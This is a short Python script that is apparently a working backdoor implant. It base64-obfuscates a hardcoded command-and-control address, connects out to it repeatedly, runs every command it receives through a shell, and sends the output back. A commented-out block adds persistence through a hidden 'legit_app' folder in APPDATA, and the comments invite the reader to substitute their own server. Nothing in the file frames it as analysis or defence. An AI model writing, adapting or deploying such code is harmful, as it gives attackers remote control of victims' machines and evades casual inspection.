import os
import socket
import subprocess
import base64
import ctypes
import time

def obfuscate_command(cmd):
    return base64.b64encode(cmd.encode()).decode()

def deobfuscate_command(encoded_cmd):
    return base64.b64decode(encoded_cmd.encode()).decode()

def connect_to_c2():
    # Obfuscated C2 details (replace with your server)
    c2_ip_encoded = "MTkyLjE2OC4xLjEwMA=="  # Base64 for "192.168.1.100"
    c2_port_encoded = "NDQz"               # Base64 for "443"
    
    c2_ip = deobfuscate_command(c2_ip_encoded)
    c2_port = int(deobfuscate_command(c2_port_encoded))
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((c2_ip, c2_port))
            
            while True:
                encoded_cmd = s.recv(1024).decode()
                if not encoded_cmd:
                    break
                
                cmd = deobfuscate_command(encoded_cmd)
                if cmd.lower() == "exit":
                    s.close()
                    return
                
                # Execute the command
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                
                # Send output back to C2
                s.send(obfuscate_command(stdout.decode() + stderr.decode()))
        except Exception as e:
            time.sleep(5)  # Retry after delay

if __name__ == "__main__":
    # Optional: Persistence (uncomment if needed)
    # if not os.path.exists(os.path.join(os.getenv("APPDATA"), "legit_app")):
    #     os.makedirs(os.path.join(os.getenv("APPDATA"), "legit_app")
    #     ctypes.windll.kernel32.SetFileAttributesW(os.path.join(os.getenv("APPDATA"), "legit_app"), 2)  # Hidden
    
    connect_to_c2()

